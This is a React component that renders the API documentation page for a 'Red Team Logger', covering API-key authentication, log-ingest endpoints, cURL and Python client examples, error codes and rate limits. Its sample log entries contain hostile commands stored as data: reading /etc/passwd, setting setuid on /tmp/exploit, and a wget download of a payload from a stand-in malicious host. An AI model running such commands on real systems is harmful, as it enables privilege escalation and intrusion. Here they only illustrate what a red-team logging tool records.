// frontend/src/components/ApiDocumentation.jsx
import React, { useState } from 'react';
import { Book, Copy, ChevronRight, ChevronDown, Info, Code, Terminal, AlertCircle, Clock } from 'lucide-react';

const ApiDocumentation = () => {
  const [openSections, setOpenSections] = useState({
    authentication: true,
    endpoints: false,
    examples: false,
    errors: false,
    rateLimit: false
  });

  // Toggle section open/closed state
  const toggleSection = (section) => {
    setOpenSections(prev => ({
      ...prev,
      [section]: !prev[section]
    }));
  };

  // Copy text to clipboard
  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
  };

  return (
    <div className="w-full">
      <div className="flex items-center gap-2 mb-4">
        <Book className="text-blue-400" size={24} />
        <h2 className="text-xl font-bold text-white">API Documentation</h2>
      </div>

      <div className="bg-gray-800 rounded-lg p-4 shadow-lg">
        <div className="mb-6 text-gray-300">
          <p>
            The Red Team Logger provides a REST API for programmatic submission of logs via API keys.
            This enables integration with external tools and automation workflows.
          </p>
        </div>

        {/* Authentication Section */}
        <div className="mb-4 border border-gray-700 rounded-lg overflow-hidden">
          <button
            onClick={() => toggleSection('authentication')}
            className="w-full p-3 bg-gray-700 text-white flex justify-between items-center hover:bg-gray-600 transition-colors"
          >
            <div className="flex items-center gap-2">
              <Info size={18} className="text-blue-400" />
              <span className="font-medium">Authentication</span>
            </div>
            {openSections.authentication ? <ChevronDown size={18} /> : <ChevronRight size={18} />}
          </button>
          
          {openSections.authentication && (
            <div className="p-4">
              <p className="text-gray-300 mb-4">
                All API requests require authentication using an API key. API keys must be included in each request's header.
              </p>
              
              <div className="bg-gray-900 p-3 rounded-md mb-4">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-blue-300 font-medium">API Key Header</span>
                  <button 
                    onClick={() => copyToClipboard('X-API-Key: rtl_yourkey_abc123')}
                    className="text-gray-400 hover:text-white p-1 rounded"
                    title="Copy to clipboard"
                  >
                    <Copy size={16} />
                  </button>
                </div>
                <pre className="text-gray-300 font-mono text-sm">X-API-Key: rtl_yourkey_abc123</pre>
              </div>
              
              <div className="text-gray-300">
                <p className="mb-2">Important notes about API keys:</p>
                <ul className="list-disc list-inside space-y-1 pl-4 text-sm">
                  <li>API keys must be kept secure and never exposed publicly</li>
                  <li>Keys can be revoked at any time from the API Key Management panel</li>
                  <li>Each key has specific permissions determining what operations it can perform</li>
                  <li>API keys may have expiration dates after which they become invalid</li>
                </ul>
              </div>
            </div>
          )}
        </div>

        {/* Endpoints Section */}
        <div className="mb-4 border border-gray-700 rounded-lg overflow-hidden">
          <button
            onClick={() => toggleSection('endpoints')}
            className="w-full p-3 bg-gray-700 text-white flex justify-between items-center hover:bg-gray-600 transition-colors"
          >
            <div className="flex items-center gap-2">
              <Terminal size={18} className="text-green-400" />
              <span className="font-medium">Endpoints</span>
            </div>
            {openSections.endpoints ? <ChevronDown size={18} /> : <ChevronRight size={18} />}
          </button>
          
          {openSections.endpoints && (
            <div className="p-4">
              <div className="space-y-6">
                {/* Status endpoint */}
                <div>
                  <div className="flex items-center gap-2 mb-2">
                    <span className="bg-blue-600 text-white px-2 py-1 rounded text-xs font-bold">GET</span>
                    <span className="text-white font-mono">/ingest/status</span>
                  </div>
                  <p className="text-gray-300 mb-2">
                    Check API connectivity and validate your API key.
                  </p>
                  <div className="bg-gray-900 p-3 rounded-md mb-3">
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-blue-300 font-medium">Response Format</span>
                    </div>
                    <pre className="text-gray-300 font-mono text-sm whitespace-pre-wrap overflow-x-auto">{`{
  "status": "ok",
  "apiKey": {
    "name": "Your API Key Name",
    "keyId": "abc123",
    "permissions": ["logs:write"]
  },
  "timestamp": "2025-03-06T12:34:56.789Z"
}`}</pre>
                  </div>
                </div>

                {/* Log submission endpoint */}
                <div>
                  <div className="flex items-center gap-2 mb-2">
                    <span className="bg-green-600 text-white px-2 py-1 rounded text-xs font-bold">POST</span>
                    <span className="text-white font-mono">/ingest/logs</span>
                  </div>
                  <p className="text-gray-300 mb-2">
                    Submit one or more logs. The endpoint accepts both single log objects and arrays of log objects.
                  </p>
                  <div className="space-y-3">
                    <div className="bg-gray-900 p-3 rounded-md">
                      <div className="flex justify-between items-center mb-2">
                        <span className="text-blue-300 font-medium">Request Format (Single Log)</span>
                      </div>
                      <pre className="text-gray-300 font-mono text-sm whitespace-pre-wrap overflow-x-auto">{`{
  "internal_ip": "192.168.1.100",
  "external_ip": "203.0.113.1",
  "hostname": "victim-host",
  "domain": "example.org",
  "username": "jsmith",
  "command": "cat /etc/passwd",
  "notes": "Privilege escalation attempt",
  "filename": "passwd",
  "status": "ON_DISK"
}`}</pre>
                    </div>
                    
                    <div className="bg-gray-900 p-3 rounded-md">
                      <div className="flex justify-between items-center mb-2">
                        <span className="text-blue-300 font-medium">Request Format (Multiple Logs)</span>
                      </div>
                      <pre className="text-gray-300 font-mono text-sm whitespace-pre-wrap overflow-x-auto">{`[
  {
    "internal_ip": "192.168.1.100",
    "hostname": "host-1",
    "command": "chmod +s /tmp/exploit"
  },
  {
    "external_ip": "198.51.100.1",
    "hostname": "host-2",
    "domain": "example.org",
    "command": "wget http://malicious.com/payload"
  }
]`}</pre>
                    </div>
                    
                    <div className="bg-gray-900 p-3 rounded-md">
                      <div className="flex justify-between items-center mb-2">
                        <span className="text-blue-300 font-medium">Response Format</span>
                      </div>
                      <pre className="text-gray-300 font-mono text-sm whitespace-pre-wrap overflow-x-auto">{`{
  "message": "Processed 2 logs: 2 successful, 0 failed",
  "results": [
    {
      "id": 1234,
      "success": true
    },
    {
      "id": 1235,
      "success": true
    }
  ]
}`}</pre>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Examples Section */}
        <div className="mb-4 border border-gray-700 rounded-lg overflow-hidden">
          <button
            onClick={() => toggleSection('examples')}
            className="w-full p-3 bg-gray-700 text-white flex justify-between items-center hover:bg-gray-600 transition-colors"
          >
            <div className="flex items-center gap-2">
              <Code size={18} className="text-purple-400" />
              <span className="font-medium">Code Examples</span>
            </div>
            {openSections.examples ? <ChevronDown size={18} /> : <ChevronRight size={18} />}
          </button>
          
          {openSections.examples && (
            <div className="p-4">
              <div className="space-y-6">
                {/* cURL example */}
                <div>
                  <h3 className="text-white font-medium mb-2 flex items-center gap-2">
                    <Terminal size={16} />
                    cURL Example
                  </h3>
                  <div className="bg-gray-900 p-3 rounded-md">
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-blue-300 font-medium">Submitting a log</span>
                      <button 
                        onClick={() => copyToClipboard(`curl -X POST https://yourdomain.com/ingest/logs \\
  -H "Content-Type: application/json" \\
  -H "X-API-Key: rtl_yourkey_abc123" \\
  -d '{
    "internal_ip": "192.168.1.100",
    "external_ip": "203.0.113.1",
    "hostname": "victim-host",
    "domain": "example.org",
    "username": "jsmith",
    "command": "cat /etc/passwd",
    "notes": "Privilege escalation attempt",
    "filename": "passwd",
    "status": "ON_DISK"
  }'`)}
                        className="text-gray-400 hover:text-white p-1 rounded"
                        title="Copy to clipboard"
                      >
                        <Copy size={16} />
                      </button>
                    </div>
                    <pre className="text-gray-300 font-mono text-sm whitespace-pre-wrap overflow-x-auto">{`curl -X POST https://yourdomain.com/ingest/logs \\
  -H "Content-Type: application/json" \\
  -H "X-API-Key: rtl_yourkey_abc123" \\
  -d '{
    "internal_ip": "192.168.1.100",
    "external_ip": "203.0.113.1",
    "hostname": "victim-host",
    "domain": "example.org",
    "username": "jsmith",
    "command": "cat /etc/passwd",
    "notes": "Privilege escalation attempt",
    "filename": "passwd",
    "status": "ON_DISK"
  }'`}</pre>
                  </div>
                </div>

                {/* Python example */}
                <div>
                  <h3 className="text-white font-medium mb-2 flex items-center gap-2">
                    <Code size={16} />
                    Python Example
                  </h3>
                  <div className="bg-gray-900 p-3 rounded-md">
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-blue-300 font-medium">Simple client</span>
                      <button 
                        onClick={() => copyToClipboard(`import requests

def send_log(api_key, log_data):
    url = "https://yourdomain.com/ingest/logs"
    headers = {
        "Content-Type": "application/json",
        "X-API-Key": api_key
    }
    
    response = requests.post(url, headers=headers, json=log_data)
    response.raise_for_status()
    return response.json()

# Example usage
api_key = "rtl_yourkey_abc123"
log_data = {
    "internal_ip": "192.168.1.100",
    "hostname": "victim-host",
    "command": "cat /etc/passwd",
    "status": "ON_DISK"
}

result = send_log(api_key, log_data)
print(result)`)}
                        className="text-gray-400 hover:text-white p-1 rounded"
                        title="Copy to clipboard"
                      >
                        <Copy size={16} />
                      </button>
                    </div>
                    <pre className="text-gray-300 font-mono text-sm whitespace-pre-wrap overflow-x-auto">{`import requests

def send_log(api_key, log_data):
    url = "https://yourdomain.com/ingest/logs"
    headers = {
        "Content-Type": "application/json",
        "X-API-Key": api_key
    }
    
    response = requests.post(url, headers=headers, json=log_data)
    response.raise_for_status()
    return response.json()

# Example usage
api_key = "rtl_yourkey_abc123"
log_data = {
    "internal_ip": "192.168.1.100",
    "hostname": "victim-host",
    "command": "cat /etc/passwd",
    "status": "ON_DISK"
}

result = send_log(api_key, log_data)
print(result)`}</pre>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Error Responses Section */}
        <div className="mb-4 border border-gray-700 rounded-lg overflow-hidden">
          <button
            onClick={() => toggleSection('errors')}
            className="w-full p-3 bg-gray-700 text-white flex justify-between items-center hover:bg-gray-600 transition-colors"
          >
            <div className="flex items-center gap-2">
              <AlertCircle size={18} className="text-red-400" />
              <span className="font-medium">Error Responses</span>
            </div>
            {openSections.errors ? <ChevronDown size={18} /> : <ChevronRight size={18} />}
          </button>
          
          {openSections.errors && (
            <div className="p-4">
              <p className="text-gray-300 mb-4">
                The API returns appropriate HTTP status codes along with error details in JSON format.
              </p>
              
              <div className="space-y-4">
                <div>
                  <div className="flex items-center gap-2 mb-2">
                    <span className="bg-red-600 text-white px-2 py-1 rounded text-xs">401 Unauthorized</span>
                  </div>
                  <div className="bg-gray-900 p-3 rounded-md">
                    <pre className="text-gray-300 font-mono text-sm">{`{
  "error": "Invalid API key"
}`}</pre>
                  </div>
                </div>
                
                <div>
                  <div className="flex items-center gap-2 mb-2">
                    <span className="bg-red-600 text-white px-2 py-1 rounded text-xs">403 Forbidden</span>
                  </div>
                  <div className="bg-gray-900 p-3 rounded-md">
                    <pre className="text-gray-300 font-mono text-sm">{`{
  "error": "Insufficient permissions",
  "detail": "This API key does not have the required permission: logs:write"
}`}</pre>
                  </div>
                </div>
                
                <div>
                  <div className="flex items-center gap-2 mb-2">
                    <span className="bg-red-600 text-white px-2 py-1 rounded text-xs">400 Bad Request</span>
                  </div>
                  <div className="bg-gray-900 p-3 rounded-md">
                    <pre className="text-gray-300 font-mono text-sm">{`{
  "error": "Invalid log data"
}`}</pre>
                  </div>
                </div>
                
                <div>
                  <div className="flex items-center gap-2 mb-2">
                    <span className="bg-red-600 text-white px-2 py-1 rounded text-xs">429 Too Many Requests</span>
                  </div>
                  <div className="bg-gray-900 p-3 rounded-md">
                    <pre className="text-gray-300 font-mono text-sm">{`{
  "error": "Too many requests",
  "detail": "Rate limit exceeded. Try again later."
}`}</pre>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Rate Limits Section */}
        <div className="mb-4 border border-gray-700 rounded-lg overflow-hidden">
          <button
            onClick={() => toggleSection('rateLimit')}
            className="w-full p-3 bg-gray-700 text-white flex justify-between items-center hover:bg-gray-600 transition-colors"
          >
            <div className="flex items-center gap-2">
              <Clock size={18} className="text-yellow-400" />
              <span className="font-medium">Rate Limits</span>
            </div>
            {openSections.rateLimit ? <ChevronDown size={18} /> : <ChevronRight size={18} />}
          </button>
          
          {openSections.rateLimit && (
            <div className="p-4">
              <p className="text-gray-300 mb-4">
                To ensure system stability, the API enforces rate limits on requests. These limits are applied per API key.
              </p>
              
              <div className="bg-gray-900 p-4 rounded-md">
                <table className="w-full text-gray-300 text-sm">
                  <thead>
                    <tr className="border-b border-gray-700">
                      <th className="text-left pb-2">Endpoint</th>
                      <th className="text-left pb-2">Limit</th>
                      <th className="text-left pb-2">Window</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr className="border-b border-gray-700">
                      <td className="py-2 font-mono">/ingest/status</td>
                      <td className="py-2">10 requests</td>
                      <td className="py-2">1 minute</td>
                    </tr>
                    <tr>
                      <td className="py-2 font-mono">/ingest/logs</td>
                      <td className="py-2">60 requests</td>
                      <td className="py-2">1 minute</td>
                    </tr>
                  </tbody>
                </table>
              </div>
              
              <div className="mt-4 text-gray-300 text-sm">
                <p>Additional limits:</p>
                <ul className="list-disc list-inside pl-4 mt-2">
                  <li>Maximum 50 logs per batch request</li>
                  <li>Maximum 10MB per request</li>
                </ul>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default ApiDocumentation;